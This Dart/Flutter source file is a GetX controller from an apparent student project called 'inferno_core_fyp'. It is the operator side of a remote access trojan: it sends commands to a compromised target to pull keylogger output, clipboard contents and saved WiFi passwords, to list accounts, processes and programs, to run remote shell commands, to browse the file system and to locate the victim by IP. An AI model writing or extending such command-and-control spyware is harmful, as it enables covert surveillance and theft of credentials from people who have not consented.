import 'package:flutter/material.dart';
import 'package:get/get.dart';
import 'package:inferno_core_fyp/models/file_model.dart';
import 'package:inferno_core_fyp/models/process_model.dart';
import 'package:inferno_core_fyp/res/helper_extensions.dart';

import '../../models/account_model.dart';
import '../../models/hardware_info_model.dart';
import '../../models/programs_model.dart';
import '../../utils/utils.dart';
import 'io_attacker_controller.dart';

class GeneralController extends GetxController {
  RxInt selectedIndex = 0.obs, maxLines = 1.obs;
  RxBool isClipboard = true.obs,
      loading = false.obs,
      isMove = false.obs,
      isTaskManagerEnabled = true.obs;
  RxDouble cpuUsage = 0.0.obs, usedRam = 0.0.obs, totalRam = 1.0.obs;

  RxString sysModelName = ''.obs, sysRam = ''.obs, sysOS = ''.obs;
  RxString clipboardData = 'No data'.obs,
      keyloggerData = ''.obs,
      hostFileData = ''.obs,
      shellData = ''.obs;
  RxString publicIP = ''.obs,
      country = ''.obs,
      city = ''.obs,
      currentDir = ''.obs,
      moveFilePath = ''.obs,
      showInTable = ''.obs;

  Rx<HardwareInfo> hardwareInfo = HardwareInfo(
    cpuUsage: '',
    ramUsage: RamUsage(totalGb: 0, usedGb: 0),
    diskUsage: [],
    bootTime: '',
    networkInterfaces: {},
    battery: '',
  ).obs;

  RxList<DataRow> networkData = <DataRow>[].obs;
  RxList<Process> processes = <Process>[].obs;
  RxList<Account> accounts = <Account>[].obs;
  RxList<Program> programs = <Program>[].obs;
  RxList<FileItem> files = <FileItem>[].obs;

  final generalController = TextEditingController().obs;

  IoAttackerController ioAttackerController = Get.put(IoAttackerController());

  Future<void> getSystemInfo(String targetId) async {
    await Future.delayed(const Duration(seconds: 1));
    if (sysModelName.value == '') {
      try {
        Map<String, dynamic> response =
            await ioAttackerController.executeCommand(
          targetId: targetId,
          data: {"text": "GET_SYSTEM_INFO", "command_args": {}},
        );
        sysModelName.value = response["result"]["Node Name"];
        sysOS.value = response["result"]["OS"];
        sysRam.value = response["result"]["Total Memory"];
      } catch (e) {
        Utils.toastMsg("Error: $e");
      }
    }
  }

  Future<void> getClipboardData(String targetId) async {
    try {
      Map<String, dynamic> response = await ioAttackerController.executeCommand(
        targetId: targetId,
        data: {"text": "GET_CLIPBOARD", "command_args": {}},
      );
      clipboardData.value = response["result"];
    } catch (e) {
      Utils.toastMsg("Error: $e");
    }
  }

  Future<void> getKeyloggerData(String targetId) async {
    try {
      Map<String, dynamic> response = await ioAttackerController.executeCommand(
        targetId: targetId,
        data: {"text": "EXPORT_KEYLOG_TEXT", "command_args": {}},
      );
      if (response.containsKey("result") &&
          response["result"].containsKey("text")) {
        keyloggerData.value = response["result"]["text"];
      } else {
        keyloggerData.value = "No keystrokes to export";
      }
    } catch (e) {
      Utils.toastMsg("Error: $e");
    }
  }

  Future<void> getNetworkInfo(String targetId) async {
    await Future.delayed(const Duration(seconds: 1));
    if (publicIP.value == '' || city.value == '') {
      try {
        Map<String, dynamic> response2 =
            await ioAttackerController.executeCommand(
          targetId: targetId,
          showLoading: false,
          data: {"text": "GET_IP_INFO", "command_args": {}},
        );
        Map<String, dynamic> response =
            await ioAttackerController.executeCommand(
          targetId: targetId,
          data: {"text": "GET_PUBLIC_IP", "command_args": {}},
        );
        country.value = response2["result"]["country"];
        city.value = response2["result"]["city"];
        publicIP.value = response["result"];
      } catch (e) {
        Utils.toastMsg("Error: $e");
      }
    }
  }

  Future<void> getWifiPasswords(String targetId) async {
    try {
      Map<String, dynamic> response = await ioAttackerController.executeCommand(
        targetId: targetId,
        data: {"text": "GET_WIFI_PASSWORDS", "command_args": {}},
      );
      final Map<String, dynamic> result = response['result'];
      final List<DataRow> rows = result.entries.map((entry) {
        final wifiName = entry.key;
        final password = entry.value;
        return DataRow(cells: [
          DataCell(Text(wifiName)),
          DataCell(Text(password)),
        ]);
      }).toList();

      networkData.assignAll(rows);
      showInTable.value = 'passwords';
    } catch (e) {
      Utils.toastMsg("Error: $e");
    }
  }

  Future<void> getAvailableDevices(String targetId) async {
    try {
      Map<String, dynamic> response = await ioAttackerController.executeCommand(
        targetId: targetId,
        data: {"text": "GET_DEVICES_ON_NETWORK", "command_args": {}},
      );
      List<dynamic> wifiList = response['result'];
      List<DataRow> rows = wifiList.map((wifi) {
        String ip = wifi['ip'];
        String mac = wifi['mac'];
        return DataRow(cells: [
          DataCell(Text(ip)),
          DataCell(Text(mac)),
        ]);
      }).toList();

      networkData.assignAll(rows);
      showInTable.value = 'availableDevices';
    } catch (e) {
      Utils.toastMsg("Error: $e");
    }
  }

  Future<void> getWifiNetworks(String targetId) async {
    try {
      Map<String, dynamic> response = await ioAttackerController.executeCommand(
        targetId: targetId,
        data: {"text": "GET_WIFI_NETWORKS", "command_args": {}},
      );
      List<dynamic> wifiList = response['result'];
      List<DataRow> rows = wifiList.map((wifi) {
        String ssid = wifi['SSID'];
        String security = wifi['Security'];
        return DataRow(cells: [
          DataCell(Text(ssid)),
          DataCell(Text(security)),
        ]);
      }).toList();

      networkData.assignAll(rows);
      showInTable.value = 'wifiNetworks';
    } catch (e) {
      Utils.toastMsg("Error: $e");
    }
  }

  Future<void> runShellCommand(String targetId, String sessionId) async {
    try {
      Map<String, dynamic> response = await ioAttackerController.executeCommand(
        targetId: targetId,
        data: {
          "text": "SHELL",
          "command_args": {
            "session_id": sessionId,
            "command": generalController.value.text.trim()
          }
        },
      );
      maxLines.value = 2;
      generalController.value.text = response["result"];
    } catch (e) {
      Utils.toastMsg("Error: $e");
    }
  }

  Future<void> getHostFile(String targetId) async {
    try {
      Map<String, dynamic> response = await ioAttackerController.executeCommand(
        targetId: targetId,
        data: {"text": "GET_HOSTFILE_CONTENTS", "command_args": {}},
      );
      generalController.value.text = response["result"];
    } catch (e) {
      Utils.toastMsg("Error: $e");
    }
  }

  Future<void> getAccounts(String targetId) async {
    await Future.delayed(const Duration(seconds: 1));
    try {
      Map<String, dynamic> response = await ioAttackerController.executeCommand(
        targetId: targetId,
        data: {"text": "GET_ACCOUNTS", "command_args": {}},
      );
      List<dynamic> jsonData = response['result'];
      accounts.value = jsonData.map((data) => Account.fromJson(data)).toList();
    } catch (e) {
      Utils.toastMsg("Error: $e");
    }
  }

  Future<void> getProcesses(String targetId) async {
    await Future.delayed(const Duration(seconds: 1));
    try {
      Map<String, dynamic> response = await ioAttackerController.executeCommand(
        targetId: targetId,
        data: {"text": "GET_PROCESSES", "command_args": {}},
      );
      List<dynamic> jsonData = response['result'];
      processes.value = jsonData.map((data) => Process.fromJson(data)).toList();
    } catch (e) {
      Utils.toastMsg("Error: $e");
    }
  }

  Future<void> getPrograms(String targetId) async {
    await Future.delayed(const Duration(seconds: 1));

    try {
      Map<String, dynamic> response = await ioAttackerController.executeCommand(
        targetId: targetId,
        data: {"text": "GET_INSTALLED_PROGRAMS", "command_args": {}},
      );
      Programs programsList = Programs.fromJson(response['result']);
      programs.value = programsList.programs;
    } catch (e) {
      Utils.toastMsg("Error: $e");
    }
  }

  Future<void> getHardwareInfo(String targetId) async {
    await Future.delayed(const Duration(seconds: 1));
    try {
      Map<String, dynamic> response = await ioAttackerController.executeCommand(
        targetId: targetId,
        data: {"text": "GET_COMPLETE_SYS_INFO", "command_args": {}},
      );
      hardwareInfo.value = HardwareInfo.fromJson(response);
      cpuUsage.value = hardwareInfo.value.cpuUsage.toPercentageValue();
      usedRam.value = hardwareInfo.value.ramUsage.usedGb.roundOff(1);
      totalRam.value = hardwareInfo.value.ramUsage.totalGb.roundOff(1);
    } catch (e) {
      Utils.toastMsg("Error: $e");
    }
  }

  Future<void> getCurrentDirAndFiles(String targetId, String sessionId) async {
    await Future.delayed(const Duration(seconds: 1));
    try {
      loading.value = true;
      Map<String, dynamic> response = await ioAttackerController.executeCommand(
        targetId: targetId,
        data: {
          "text": "GETCWD",
          "command_args": {"session_id": sessionId}
        },
      );
      currentDir.value = response["result"];
      await getFilesInDirectory(targetId, sessionId);
      loading.value = false;
    } catch (e) {
      loading.value = false;
      Utils.toastMsg("Error: $e");
    }
  }

  Future<void> getFilesInDirectory(String targetId, String sessionId) async {
    try {
      Map<String, dynamic> response = await ioAttackerController.executeCommand(
        targetId: targetId,
        data: {
          "text": "LIST_CURRENT_DIRECTORY",
          "command_args": {"session_id": sessionId, "path": currentDir.value}
        },
      );
      FileItemsResponse fileItemsResponse =
          FileItemsResponse.fromJson(response);
      files.value = fileItemsResponse.result;
    } catch (e) {
      Utils.toastMsg("Error: $e");
    }
  }

  Future<void> changeDirectory(
      {required String targetId,
      required String sessionId,
      required String path}) async {
    try {
      await ioAttackerController.submitCommand(
        targetId: targetId,
        data: {
          "text": "CHDIR",
          "command_args": {"session_id": sessionId, "path": path}
        },
      );
      getCurrentDirAndFiles(targetId, sessionId);
    } catch (e) {
      Utils.toastMsg("Error: $e");
    }
  }
}
